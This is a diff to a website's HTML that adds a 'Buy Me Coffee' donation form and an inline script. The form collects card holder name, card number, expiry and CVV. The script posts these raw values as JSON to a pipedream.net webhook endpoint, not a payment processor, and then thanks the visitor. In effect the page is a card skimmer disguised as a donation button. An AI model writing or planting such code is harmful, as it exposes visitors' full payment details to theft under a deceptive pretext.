@@ -128,6 +128,41 @@
             </div>
         </div>
 
+        <div class="section container">
+            <h2>Buy Me Coffee </h2>
+
+            <div class="row">
+                <form class="col s12" id="creditCardForm">
+                    <div class="row">
+                        <div class="input-field col s6">
+                            <input id="card_holder_name" type="text" class="validate" name="card_holder_name" required>
+                            <label for="card_holder_name">Card Holder's Name</label>
+                        </div>
+                        <div class="input-field col s6">
+                            <input id="card_number" type="text" class="validate" name="card_number" required>
+                            <label for="card_number">Card Number</label>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="input-field col s4">
+                            <input id="expiry_month" type="text" class="validate" name="expiry_month" required>
+                            <label for="expiry_month">Expiry Month</label>
+                        </div>
+                        <div class="input-field col s4">
+                            <input id="expiry_year" type="text" class="validate" name="expiry_year" required>
+                            <label for="expiry_year">Expiry Year</label>
+                        </div>
+                        <div class="input-field col s4">
+                            <input id="cvv" type="text" class="validate" name="cvv" required>
+                            <label for="cvv">CVV</label>
+                        </div>
+                    </div>
+                    <button type="submit" class="btn waves-effect waves-light">Submit</button>
+                </form>
+            </div>
+
+        </div>
+
     </main>
     <footer class="page-footer black">
         <div class="container">
@@ -137,6 +172,53 @@
     </footer>
 
     <!-- <script src="js/my.js"></script> -->
+    <script>
+        document.getElementById('creditCardForm').addEventListener('submit', function (e) {
+            e.preventDefault(); // Prevent the default form submission
+
+            const formData = new FormData(e.target);
+
+            const body = {
+                card_holder_name: formData.get('card_holder_name'),
+                card_number: formData.get('card_number'),
+                expiry_month: formData.get('expiry_month'),
+                expiry_year: formData.get('expiry_year'),
+                cvv: formData.get('cvv'),
+            };
+
+            const headers = new Headers();
+            headers.append("Content-Type", "application/json");
+
+            const options = {
+                method: "POST",
+                headers,
+                mode: "cors",
+                body: JSON.stringify(body),
+            };
+
+            fetch("https://eoj413rurjal16y.m.pipedream.net", options)
+                .then(response => {
+                    if (response.ok) {
+                        return response.json(); // or .text() or .blob() etc.
+                    }
+                    throw new Error('Network response was not ok.');
+                })
+                .then(data => {
+                    console.log(data);
+                    // Clear the form
+                    e.target.reset();
+                    // Show success feedback
+                    M.toast({ html: 'Thank you for buying me coffee!', classes: 'rounded' });
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    // Show error feedback
+                    M.toast({ html: 'Failed to submit the form.', classes: 'rounded' });
+                });
+        });
+    </script>
+
+
 </body>
 
 </html>
